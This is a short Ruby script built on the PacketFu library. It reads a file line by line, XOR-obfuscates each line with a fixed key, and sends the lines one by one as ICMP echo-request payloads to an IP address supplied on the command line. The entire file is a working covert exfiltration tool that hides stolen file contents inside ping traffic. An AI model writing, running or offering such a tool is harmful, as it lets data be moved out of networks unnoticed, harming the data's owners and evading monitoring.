require 'packetfu'


dest_ip = ARGV[0]
file = ARGV[1]
config = config = PacketFu::Utils.whoami?

def encrypt_payload(string, key = 0x42)
  string.bytes.map {|b| b ^ key }.pack('C*')
end

File.readlines(file).each do |line|
  icmp_packet = PacketFu::ICMPPacket.new(:config => config)
  icmp_packet.ip_daddr = dest_ip
  icmp_packet.payload = encrypt_payload(line)
  icmp_packet.icmp_type = 8
  icmp_packet.recalc
  icmp_packet.to_w

  puts "=" * 80
  puts icmp_packet.inspect
  puts ""
  sleep(2)
end

